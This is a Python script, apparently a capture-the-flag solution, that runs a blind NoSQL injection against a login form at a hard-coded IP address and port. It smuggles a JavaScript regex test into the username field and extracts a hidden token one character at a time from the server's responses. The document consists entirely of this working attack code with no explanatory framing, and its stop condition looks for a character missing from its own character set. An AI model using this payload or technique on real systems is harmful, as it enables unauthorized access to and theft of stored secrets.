import requests

# Oracle
def oracle(t, proxies=None):
    url = "http://94.237.48.205:59780/login"
    headers = {
        'Host': '94.237.48.205:59780',
        'Content-Length': '151',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://94.237.48.205:59780',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://94.237.48.205:59780/login',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }
    data = {
        "username": 'a"%20||%20this.token.match(/^' + t + '/)%20||%20db.getCollectionNames().indexOf(\'nonexistentFunction\')%20>%20-1;%20var%20xyz="a',
        "password": "test"
    }
    payload = 'username={}&password={}'.format(data["username"], data["password"])

    r = requests.post(url=url, headers=headers, data=payload)
    return "Forgot" in r.text

# Static character set
character_set = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890-"

# Dump the data_to_extract
data_to_extract = ""  

while True:  
    found = False
    for char in character_set:
        if oracle(data_to_extract + char):  
            data_to_extract += char  
            print(data_to_extract)
            if char == '}':
                found = True
                break
            else:
                found = False
                break  

    if found:
        break

assert (oracle(data_to_extract) == True)

print("data_to_extract: " + data_to_extract)
